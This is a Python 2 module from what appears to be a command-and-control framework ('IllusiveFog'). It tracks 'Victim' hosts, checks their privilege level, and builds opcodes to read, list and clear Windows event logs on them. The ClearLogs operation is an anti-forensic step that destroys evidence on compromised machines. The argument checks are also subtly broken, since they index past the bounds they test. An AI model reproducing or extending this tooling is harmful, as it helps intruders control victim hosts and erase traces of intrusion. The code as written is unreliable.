from support import database

#Standard class name for each module when invoking
class IllusiveFogModule:
    def __init__(self,params=[]):
        self.params= params

        #Module Information
        self.info={
            'Name'       : 'EVTX Toolkit',
            'Description': 'Module Aims to perform operations using EVTX (Windows XML EventLog).',
            'Author'     : 'Internal Dev Team',
            'Escalated'  :  True
        }

        #Module Options
        self.options={
            'Operation': self.params[1],
            'Victim': self.params[0]
        }

        #Module Help
        self.modulehelp = """
        EVTX ToolKIT
        ============
        Description : Module Aims to perform operations using EVTX (Windows XML EventLog).
        URLS        : https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal    

        Options :
            1; GetLogs
                Example GetLogs <>
            2; GetChannel 
                Example: GetChannel
            3; ClearLogs
                Example: ClearLogs System
                

        """

        #Alias for GetLogs
        self.GetLogsOp = "0x41:"

        #Alias for GetChannel
        self.GetChannelOp = "0x42:"

        #Alias for ClearLogs
        self.ClearLogsOp = "0x43:"

#Main function which will be called, Must return
    def run(self):

        #saving options
        self.operation=self.options['Operation']
        self.victim = self.options['Victim']
        
        #print info about module
        print ""
        print "Module Info:"
        print "-----------"
        print "Name :"+self.info['Name'] 
        print "Description :"+self.info['Description']
        print "Author :"+self.info['Author']
        print "[info] For more info about module usage, use option 'help'. example: EVTX help"
        print "\n"
        
        if self.info['Escalated'] == True:
            

            #Check Privileges  
            if database.Victim().FetchVictimPrivLvl(self.victim) != "1":
                print "[-] Operation cannot be initiated since Victim is not privileged enough."
                return False
            else:
                self.initOperation=self.operation.split()
                if self.initOperation[0] == "help":
                    print self.modulehelp
                    return False 

                elif self.initOperation[0] == "ClearLogs":
                    if len(self.initOperation) < 1:
                        print "[ERROR] Not Enough Arguments."
                    else:
                        return self.ClearLogsOp+self.initOperation[1]

                elif self.initOperation[0] == "GetChannel":
                    return self.GetChannelOp
                    
                elif self.initOperation[0] == "GetLogs":
                    if len(self.initOperation) < 2:
                        print "[ERROR] Not Enough Arguments."
                    else:
                        print self.GetLogsOp+self.initOperation[1]+":"+self.initOperation[2]
                        return self.GetLogsOp+self.initOperation[1]+":"+self.initOperation[2]
                
                else:
                    print "[ERROR] Invalid Operation."
                    return False
